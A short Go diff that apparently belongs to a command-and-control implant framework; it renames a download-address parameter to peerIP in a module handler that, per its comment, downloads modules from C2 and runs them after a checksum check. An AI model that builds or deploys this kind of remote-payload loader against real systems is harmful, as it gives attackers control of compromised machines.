@@ -18,11 +18,11 @@ import (
 var fetchFile = c2transport.FetchFile
 
 // ModuleHandler downloads and runs modules from C2 using resolved, typed invocation data
-func ModuleHandler(download_addr, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
+func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum string, invocation def.ResolvedInvocation) (out string) {
 	var err error
 
 	// download and verify module file
-	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, download_addr)
+	payload_data_downloaded, downloadErr := downloadAndVerifyModule(file_to_download, checksum, peerIP)
 	if downloadErr != nil {
 		return downloadErr.Error()
 	}
@@ -69,10 +69,10 @@ func ModuleHandler(download_addr, file_to_download, payload_type, modName, check
 	}
 }
 
-func downloadAndVerifyModule(file_to_download, checksum, download_addr string) (data []byte, err error) {
+func downloadAndVerifyModule(file_to_download, checksum, peerIP string) (data []byte, err error) {
 	for retry := 0; retry < 3; retry++ {
 		if crypto.SHA256SumFile(file_to_download) != checksum {
-			if data, err = fetchFile(common.RuntimeConfig, download_addr, file_to_download, "", checksum); err != nil {
+			if data, err = fetchFile(common.RuntimeConfig, peerIP, file_to_download, "", checksum); err != nil {
 				return nil, fmt.Errorf("downloading %s: %v", file_to_download, err)
 			}
 		} else {
